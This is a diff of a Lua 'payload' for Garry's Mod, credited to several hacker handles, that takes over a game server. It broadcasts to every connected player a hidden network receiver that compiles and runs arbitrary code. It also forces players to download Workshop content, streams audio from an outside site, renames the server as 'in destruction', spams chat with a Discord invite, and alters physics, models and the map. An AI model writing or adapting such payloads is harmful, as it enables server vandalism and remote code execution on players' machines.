@@ -1,6 +1,8 @@
 -- Payload Created by Kurama
 
--- Venom SSV V2
+-- Debug by Doge Chien
+
+-- Visuel Kawai SSV
 
 -- Obligation to credit myself in the visual
 
@@ -22,10 +24,10 @@ local randomtable = {
 util.AddNetworkString(randomtable["TimingRandom"])
 util.AddNetworkString(randomtable["CodeRandom"])
 BroadcastLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
-hook.Add("PlayerInitialSpawn", "BonsoirParis", function(ply)
+hook.Add("PlayerInitialSpawn", "MacdoFritesKetchup", function(ply)
     if not ply:IsBot() then
         ply:SendLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
-        ply:SendLua([[steamworks.DownloadUGC(2033009436, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
+        ply:SendLua([[steamworks.DownloadUGC(2017072873, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
     end
 end)
 
@@ -39,124 +41,66 @@ local len = #data
     net.Broadcast()
 end
 for k, v in pairs(player.GetAll()) do
-    v:SendLua([[steamworks.DownloadUGC(2033009436, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
+    v:SendLua("steamworks.FileInfo(2017072330,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
+    v:SendLua([[steamworks.DownloadUGC(2017072873, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
 end
 
--- Custom Settings
-timer.Simple( 5, function()
-    RunConsoleCommand("sv_gravity", "200")
-end)
-
-timer.Create("LoadGM", 235, 1, function()
-    RunConsoleCommand("ulx", "map", "gm_construct")
-end)
-
-timer.Simple(5, function()
-    for k, v in pairs(player.GetAll()) do
-        v:SetRunSpeed(400 * 4)
-        v:SetWalkSpeed(400 * 4)
-    end
-end)
-
 timer.Simple(2.5, function()
+    RunConsoleCommand("hostname", "Serveur en cours de Destruction by Kawai SSV -) discord.gg/kurama")
     RunConsoleCommand("ulx", "god", "*")
+    RunConsoleCommand("sv_alltalk", "1")
     PrecacheParticleSystem("lesheitan")
 end)
 
--- Particle - 2
+-- Bordel - Spam Notif
 timer.Simple(5, function()
 InfoClient([[net.Receive("]] .. randomtable["TimingRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
 InfoClient([[
     for i = 1, 10 do
     ParticleEffectAttach("lesheitan", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
 end
-]])
-end)
-
--- Notif Spam
 timer.Simple(5, function()
-    InfoClient([[
-timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
-    notification.AddLegacy( "Server Hack by Kurama !", math.random(0, 4), 1.5 )
+timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
+    notification.AddLegacy( "Doge Chien", math.random(0, 4), 1.5 )
 end)
-
-timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
-    notification.AddLegacy( "Server Hack by TheCedoux !", math.random(0, 4), 1.5 )
+timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
+    notification.AddLegacy( "Kurama", math.random(0, 4), 1.5 )
 end)
-
-timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
-    notification.AddLegacy( "Server Hack by Doge Chien", math.random(0, 4), 1.5 )
+timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
+        notification.AddLegacy( "TheCedoux", math.random(0, 4), 1.5 )
+    end)
 end)
-
-timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
-    notification.AddLegacy( "Sorry my Friends !", math.random(0, 4), 1.5 )
-end)
-
-timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
-    notification.AddLegacy( "discord.gg/kurama", math.random(0, 4), 1.5 )
-end)
-]])
-end)
-
--- SkyBox
 timer.Simple(1, function()
-InfoClient([[
     function GAMEMODE:PostDraw2DSkyBox()
-local col = Color( 255, 255, 255)
+local col = Color( 0, 0, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
     return !!1
 end
     function GAMEMODE:PreDrawSkyBox()
-local col = Color( 255, 255, 255)
+local col = Color( 0, 0, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
         return !!1
     end
+end)
 ]])
-
--- Font
-timer.Simple( 19.2, function()
-InfoClient([=[
-local WriteFont = math.Clamp(ScrH()/2.31, 0.85, 1.005);
-surface.CreateFont( "Font1", {
-    font = "Roboto",
-    extended = false,
-    size = WriteFont *  150,
-    weight = 200,
-    blursize = 1.5,
-    italic = false,
-    rotary = false,
-    shadow = false,
-    additive = false,
-    outline = false,
-    })
-    hook.Add( "HUDPaint", "Font2", function()
-    for i = 1, 60 do
-end
-    draw.SimpleTextOutlined("Kurama", "Font1", ScrW() /2, ScrH() /2,Color( 255, 255, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
-local mat = Entity(0):GetMaterials()
-    for k,v in pairs(mat) do
-    end
-end)
-]=])
-end)
 
 timer.Simple( 5, function()
 InfoClient([=[
 g_]=].. m_strImageGlobalVar.. [=[ = {}
 local html = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
 local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
-local CustomMapW = vgui.Create( "HTML" )
-    CustomMapW:SetPos( ScrW() -1, ScrH() -1 )
-    CustomMapW:SetVisible( true )
-    CustomMapW:SetMouseInputEnabled( false )
-    CustomMapW:SetKeyBoardInputEnabled( false )
-    CustomMapW:SetSize( intSizeX, intSizeY )
-    CustomMapW:SetHTML( html:format(strURL, intSizeX, intSizeY) )
+local pnl = vgui.Create( "HTML" )
+    pnl:SetPos( ScrW() -1, ScrH() -1 )
+    pnl:SetVisible( true )
+    pnl:SetMouseInputEnabled( false )
+    pnl:SetKeyBoardInputEnabled( false )
+    pnl:SetSize( intSizeX, intSizeY )
+    pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
 local PageLoaded
 PageLoaded = function()
-local mat = CustomMapW:GetHTMLMaterial()
+local mat = pnl:GetHTMLMaterial()
     if mat then
-g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, CustomMapW }
+g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
     return
 end
 timer.Simple( 0.5, PageLoaded )
@@ -166,7 +110,7 @@ end
 ]=])
 end)
 
--- Sound
+-- Zoom - Sound - Color
 InfoClient([[
 local sW, sH = ScrW(), ScrH()
 local w,h = ScrW(), ScrH()
@@ -226,12 +170,10 @@ local particle = emitter:Add("particle/particle_smokegrenade", vPos)
     particle:SetGravity(Vector(0,0,100))
     particle:SetAirResistance(500)
 end
-
 local Wmats = Entity(0):GetMaterials()
     for k,v in pairs(Wmats) do
     Material(v):SetVector("$color", Vector(0,0,0))
 end 
-
 local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
 local v = Vector(col.r / 255, col.g / 255, col.b / 255)
     for k, v in pairs( ents.FindByClass( "prop_*" ) ) do 
@@ -240,11 +182,32 @@ local v = Vector(col.r / 255, col.g / 255, col.b / 255)
 end
     for k,p in pairs(player.GetAll()) do
     p:SetColor( col )
+    end
+local chair = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
+    chair:SetNoDraw(true)
+local data = {}
+local function genChair(id)
+local pos = LocalPlayer():GetPos()
+    data[id] = { Vector(math.random(pos.x-1000,pos.x+1000),math.random(pos.y-1000,pos.y+1000),pos.z + math.random(800,1000) ), math.random(10, 70) }
 end
-
-local SoundPlay = {}
-    hook.Add("HUDPaint", "SoundStart",function()
-    for k,v in pairs(SoundPlay) do
+    for i=1, 70 do
+    genChair(i)
+end
+    hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
+local z = LocalPlayer():GetPos().z
+    for i=1, #data do
+    chair:SetPos(data[i][1])
+    chair:SetupBones()
+    chair:DrawModel()
+    data[i][1].z = data[i][1].z - data[i][2] / 20
+        if data[i][1].z <= z then
+            genChair(i)
+        end
+    end
+end)
+local LeSheitanMusique = {}
+    hook.Add("HUDPaint", "MesOreilleSaleConnard",function()
+    for k,v in pairs(LeSheitanMusique) do
         v()
     end
 end)
@@ -252,7 +215,7 @@ end)
 SOUNDSTART_CTP = false
 OZJFOZJCEZIO = true
 
-sound.PlayURL("https://lesheitan.fr/songs/Venom.mp3", "noblock", function(s)
+sound.PlayURL("https://lesheitan.fr/songs/EverythingBlack_AMV.mp3", "noblock", function(s)
     if not IsValid(s) then return end
     audio = s
     s:EnableLooping( false)
@@ -262,7 +225,7 @@ SOUNDSTART_CTP = true
     s:SetVolume(15)
     s:Play()
 local ragtbl = {}
-    SoundPlay["CoolEffect"] = function()
+    LeSheitanMusique["CoolEffect"] = function()
 local tbl = {}
     s:FFT(tbl,FFT_2048)
     xpcall(function()
@@ -274,20 +237,21 @@ end
 local oneid = "newhud"..math.random(100, 300).."id"
 local Wmats = Entity(0):GetMaterials()
     for k,v in pairs(Wmats) do
-    Material(v):SetVector("$color", Vector(0,0,0))
+    Material(v):SetVector("$color", Vector(255,255,255))
 end                         
 util.ScreenShake( Vector( 0, 0, 0 ), 50, 50, 2, 5000 ) 
     for _, v in ipairs(player.GetAll()) do
-    v:SetWeaponColor(Vector(0, 0, 0))
-end
-       
+        v:SetWeaponColor(Vector(255, 255, 255))
+    end
+                
+                
 timer.Simple(0.2, function()
 local Wmats = Entity(0):GetMaterials()
     for k,v in pairs(Wmats) do
-    Material(v):SetVector("$color", Vector(255,255,255))
+    Material(v):SetVector("$color", Vector(0,0,0))
 end                     
     for _, v in ipairs(player.GetAll()) do
-        v:SetWeaponColor(Vector(255, 255, 255))
+        v:SetWeaponColor(Vector(0, 0, 0))
     end   
     end)
 end
@@ -295,7 +259,11 @@ end
 end)
     end
 end)
-
+    surface.SetDrawColor( 255, 255, 255, 255)
+    surface.DrawTexturedRectRotated( (ScrW() /2), (ScrH() /2), 120, 120, math.sin( CurTime() *10) )
+    hook.Add( "RenderScreenspaceEffects", "KurmaBestHaxorLol", function()
+    DrawMaterialOverlay( "effects/combine_binocoverlay.vmt", 1 )
+end)
 hook.Add("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[", AudioVizualier)
 hook.Add("CalcView", "]] .. randomtable["ClientRandom"] .. [[", function(ply, origin, angles, fov, znear, zfar)
     return {
@@ -306,7 +274,6 @@ hook.Add("CalcView", "]] .. randomtable["ClientRandom"] .. [[", function(ply, or
     ["zfar"] = zfar
     }
 end)
-
 local function stop()
     audio = nil
     hook.Remove("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[")
@@ -326,35 +293,40 @@ end
 ]])
 end)
 
--- Chat Spam
+timer.Simple(5, function()
+    for k, v in pairs(player.GetAll()) do
+        v:SetModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
+    end
+end)
+
+-- Spam Chat
 timer.Simple(5, function()
 InfoClient([[  
 timer.Create("]] .. randomtable["ServeurRadom"] .. [[", 1.7, 0, function()
 local time = tonumber(0)
-local my_color = CurTime() % 6 * 60
 local Message = {
-    "< https://discord.gg/kurama >",
-    "<< https://discord.gg/kurama >>",
-    "<<< https://discord.gg/kurama >>>",
-    "<<<< https://discord.gg/kurama >>>>",
-    "<<<<< https://discord.gg/kurama >>>>>",
-    "<<<<<< https://discord.gg/kurama >>>>>>",
-    "<<<<<<< https://discord.gg/kurama >>>>>>>",
-    "<<<<<<<< https://discord.gg/kurama >>>>>>>>",
-    "<<<<<<<<< https://discord.gg/kurama >>>>>>>>>",
-    "<<<<<<<< https://discord.gg/kurama >>>>>>>>",
-    "<<<<<<< https://discord.gg/kurama >>>>>>>",
-    "<<<<<< https://discord.gg/kurama >>>>>>",
-    "<<<<< https://discord.gg/kurama >>>>>",
-    "<<<< https://discord.gg/kurama >>>>",
-    "<<< https://discord.gg/kurama >>>",
-    "<< https://discord.gg/kurama >>",
+    "< Hack by Kawai SSV >",
+    "<< Hack by Kawai SSV >>",
+    "<<< Hack by Kawai SSV >>>",
+    "<<<< Hack by Kawai SSV >>>>",
+    "<<<<< Hack by Kawai SSV >>>>>",
+    "<<<<<< Hack by Kawai SSV >>>>>>",
+    "<<<<<<< Hack by Kawai SSV >>>>>>>",
+    "<<<<<<<< Hack by Kawai SSV >>>>>>>>",
+    "<<<<<<<<< Hack by Kawai SSV >>>>>>>>>",
+    "<<<<<<<< Hack by Kawai SSV >>>>>>>>",
+    "<<<<<<< Hack by Kawai SSV >>>>>>>",
+    "<<<<<< Hack by Kawai SSV >>>>>>",
+    "<<<<< Hack by Kawai SSV >>>>>",
+    "<<<< Hack by Kawai SSV >>>>",
+    "<<< Hack by Kawai SSV >>>",
+    "<< Hack by Kawai SSV >>",
     }
     for _, line in pairs(Message) do
     time = time + tonumber(0.1)
-    timer.Simple(time,function()
-    chat.AddText(Color( my_color, my_color, my_color ),line)
-end)
+timer.Simple(time,function()
+        chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
+        end)
     end
 end)
 ]])
@@ -363,26 +335,86 @@ end)
 -- Model
 timer.Simple(5, function()
 InfoClient([[
+timer.Create("]] .. RandomString(0, 69) .. [[",1,5800,function()
+local Model12 = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
+    Model12:SetNoDraw(true)
+    Model12:SetModelScale(50)
+timer.Create("ModelLoad", 0.01, 0, function()
+    Model12:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
+end)
 local data = {}
-local function genkurama(id)
+local function ModelLoad12(id)
 local pos = LocalPlayer():GetPos()
     data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
 end
     for i=1, 50 do
-    genkurama(i)
+    ModelLoad12(i)
 end
     hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
 local z = LocalPlayer():GetPos().z
     for i=1, #data do
-        model12:SetPos(data[i][1])
-        model12:SetupBones()
-        model12:DrawModel()
+        Model12:SetPos(data[i][1])
+        Model12:SetupBones()
+        Model12:DrawModel()
         data[i][1].z = data[i][1].z - data[i][2] / 20
         if data[i][1].z <= z then
-        genkurama(i)
+        ModelLoad12(i)
     end
 end
     end)
 end)
 ]])
+end)
+
+-- Custom Settings
+timer.Simple( 5, function()
+    RunConsoleCommand("sv_gravity", "200")
+end)
+
+timer.Create("LoadGM", 235, 1, function()
+    RunConsoleCommand("ulx", "map", "gm_construct")
+end)
+
+timer.Create("Prop", 5, 0, function()
+    for k, v in pairs(ents.FindByClass("prop_*")) do
+local phys = v:GetPhysicsObject()
+    if (IsValid(phys)) then
+    phys:EnableMotion(true)
+    end
+end
+local props = ents.GetAll()
+    for _, prop in ipairs(props) do
+        if (prop:GetPhysicsObject():IsValid()) then
+            prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
+        end
+    end
+end)
+
+timer.Create("RPName", 5, 99, function()
+    for _, v in pairs(player.GetAll()) do
+        v:GodEnable()
+        v:setDarkRPVar("rpname", "Hack by Kawai SSV -) Join my Discord : discord.gg/kurama")
+    end
+end)
+
+timer.Simple(5, function()
+    for k, v in pairs(player.GetAll()) do
+        v:SetRunSpeed(400 * 4)
+        v:SetWalkSpeed(400 * 4)
+    end
+end)
+
+timer.Create(RandomString(0, 69), 5.5, 1, function()
+    for k, v in pairs(ents.FindByClass("prop_*")) do
+local phys = v:GetPhysicsObject()
+    if (IsValid(phys)) then
+        phys:EnableMotion(true)
+    end
+end
+local props = ents.GetAll()
+    for _, prop in ipairs(props) do
+        if (prop:GetPhysicsObject():IsValid()) then
+            prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
+        end
+    end
 end)
